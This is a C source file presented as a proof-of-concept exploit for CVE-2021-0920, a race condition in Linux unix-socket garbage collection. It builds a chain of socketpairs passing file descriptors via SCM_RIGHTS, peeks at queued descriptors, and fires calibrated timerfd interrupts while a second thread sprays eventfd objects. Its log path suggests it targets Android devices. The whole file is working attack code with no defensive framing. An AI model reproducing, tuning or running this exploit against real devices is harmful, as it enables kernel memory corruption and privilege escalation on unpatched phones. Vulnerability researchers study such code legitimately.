#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/timerfd.h>
#include <sys/eventfd.h>
#include <pthread.h>
#include <sched.h>
#include <errno.h>
#include <stdbool.h>
#include <stdarg.h>
#include <time.h>

volatile bool stop_race = false;
FILE* logfile = NULL;
int tfd;
int spray_sv[32][2];
int spray_efds[4];

// Увеличенный граф
int R[2], B[2], C[2], D[2];
int E1[2], E2[2], E3[2];

// Интервалы таймера для калибровки (в наносекундах)
long timer_intervals[] = {500, 1000, 2000, 5000, 10000, 20000};
int num_intervals = 6;
int current_interval_idx = 0;
long interval_counter = 0;

void log_msg(const char* fmt, ...) {
    va_list args;
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);
    printf("\n");
    if (logfile) {
        va_start(args, fmt);
        vfprintf(logfile, fmt, args);
        va_end(args);
        fprintf(logfile, "\n");
        fflush(logfile);
    }
}

void send_fd(int socket, int fd) {
    struct msghdr msg = {0};
    char buf[CMSG_SPACE(sizeof(int))];
    memset(buf, 0, sizeof(buf));
    struct iovec io = { .iov_base = (void*)"", .iov_len = 1 };
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    msg.msg_control = buf;
    msg.msg_controllen = sizeof(buf);
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    memcpy(CMSG_DATA(cmsg), &fd, sizeof(int));
    sendmsg(socket, &msg, MSG_DONTWAIT);
}

int recv_fd(int socket, int flags) {
    struct msghdr msg = {0};
    char buf[1];
    struct iovec io = { .iov_base = buf, .iov_len = sizeof(buf) };
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    char cmsg_buf[CMSG_SPACE(sizeof(int))];
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);
    if (recvmsg(socket, &msg, flags | MSG_DONTWAIT) < 0) return -1;
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    if (cmsg && cmsg->cmsg_type == SCM_RIGHTS) {
        int fd;
        memcpy(&fd, CMSG_DATA(cmsg), sizeof(int));
        return fd;
    }
    return -1;
}

void drain_socket(int socket) {
    int fd;
    while ((fd = recv_fd(socket, 0)) >= 0) {
        close(fd);
    }
}

void* spray_thread(void* arg) {
    cpu_set_t set; CPU_ZERO(&set); CPU_SET(1, &set); sched_setaffinity(0, sizeof(set), &set);
    struct msghdr msg = {0};
    char buf[CMSG_SPACE(sizeof(int) * 4)];
    memset(buf, 0, sizeof(buf));
    struct iovec io = { .iov_base = (void*)"", .iov_len = 1 };
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    msg.msg_control = buf;
    msg.msg_controllen = sizeof(buf);
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int) * 4);
    memcpy(CMSG_DATA(cmsg), spray_efds, sizeof(int) * 4);

    while (!stop_race) {
        for (int i = 0; i < 32; i++) {
            sendmsg(spray_sv[i][0], &msg, MSG_DONTWAIT);
        }
        for (int i = 0; i < 32; i++) {
            char dummy[1];
            recv(spray_sv[i][1], dummy, 1, MSG_DONTWAIT);
        }
        usleep(10); 
    }
    return NULL;
}

void* race_thread(void* arg) {
    cpu_set_t set; CPU_ZERO(&set); CPU_SET(0, &set); sched_setaffinity(0, sizeof(set), &set);

    long iter = 0;
    long success_peek = 0;
    long no_peek = 0;

    while (!stop_race) {
        // Восстанавливаем граф: R -> B -> E1 -> E2 -> E3 -> C -> D -> C
        send_fd(R[0], B[1]);
        send_fd(B[0], E1[1]);
        send_fd(E1[0], E2[1]);
        send_fd(E2[0], E3[1]);
        send_fd(E3[0], C[1]);
        send_fd(C[0], D[1]);
        send_fd(D[0], C[1]);

        // PEEK из R
        int b_fd = recv_fd(R[1], MSG_PEEK);
        if (b_fd >= 0) {
            int c_fd = recv_fd(b_fd, MSG_PEEK);
            if (c_fd >= 0) {
                // Выбираем интервал таймера
                long interval_ns = timer_intervals[current_interval_idx];
                interval_counter++;
                if (interval_counter % 10000 == 0) {
                    current_interval_idx = (current_interval_idx + 1) % num_intervals;
                    log_msg("[*] Timer interval set to %ld ns", timer_intervals[current_interval_idx]);
                }

                struct timespec now;
                clock_gettime(CLOCK_MONOTONIC, &now);
                struct itimerspec its;
                its.it_value.tv_sec = now.tv_sec;
                its.it_value.tv_nsec = now.tv_nsec + interval_ns;
                if (its.it_value.tv_nsec >= 1000000000) {
                    its.it_value.tv_sec++;
                    its.it_value.tv_nsec -= 1000000000;
                }
                its.it_interval.tv_sec = 0;
                its.it_interval.tv_nsec = 0;
                timerfd_settime(tfd, TFD_TIMER_ABSTIME, &its, NULL);

                // Обычное чтение B
                int res_b = recv_fd(b_fd, 0);
                if (res_b >= 0) close(res_b);

                // Чтение C
                int res_c = recv_fd(c_fd, 0);
                if (res_c >= 0) {
                    success_peek++;
                    close(res_c);
                }
                close(c_fd);
            }
            close(b_fd);
        } else {
            no_peek++;
        }

        // Очищаем очереди
        drain_socket(R[1]);
        drain_socket(B[1]);
        drain_socket(E1[1]);
        drain_socket(E2[1]);
        drain_socket(E3[1]);
        drain_socket(C[1]);
        drain_socket(D[1]);

        iter++;
        if (iter % 10000 == 0) {
            log_msg("[*] Iter: %ld, Success: %ld, NoPeek: %ld, Interval: %ld ns", 
                    iter, success_peek, no_peek, timer_intervals[current_interval_idx]);
        }
    }
    return NULL;
}

int main() {
    setbuf(stdout, NULL);
    logfile = fopen("/data/local/tmp/race_v26.log", "w");
    log_msg("[*] CVE-2021-0920 Race PoC v26 (Extended Graph + Timer Calibration)");

    tfd = timerfd_create(CLOCK_MONOTONIC, 0);

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, R) < 0 ||
        socketpair(AF_UNIX, SOCK_STREAM, 0, B) < 0 ||
        socketpair(AF_UNIX, SOCK_STREAM, 0, C) < 0 ||
        socketpair(AF_UNIX, SOCK_STREAM, 0, D) < 0 ||
        socketpair(AF_UNIX, SOCK_STREAM, 0, E1) < 0 ||
        socketpair(AF_UNIX, SOCK_STREAM, 0, E2) < 0 ||
        socketpair(AF_UNIX, SOCK_STREAM, 0, E3) < 0) {
        log_msg("[-] socketpair failed");
        return 1;
    }

    for (int i = 0; i < 32; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, spray_sv[i]) < 0) return 1;
    }
    for (int i = 0; i < 4; i++) {
        spray_efds[i] = eventfd(0, 0);
    }

    pthread_t t_spray, t_race;
    pthread_create(&t_spray, NULL, spray_thread, NULL);
    pthread_create(&t_race, NULL, race_thread, NULL);

    sleep(300);
    stop_race = true;

    pthread_join(t_spray, NULL);
    pthread_join(t_race, NULL);

    log_msg("[-] PoC finished.");
    if (logfile) fclose(logfile);
    return 0;
}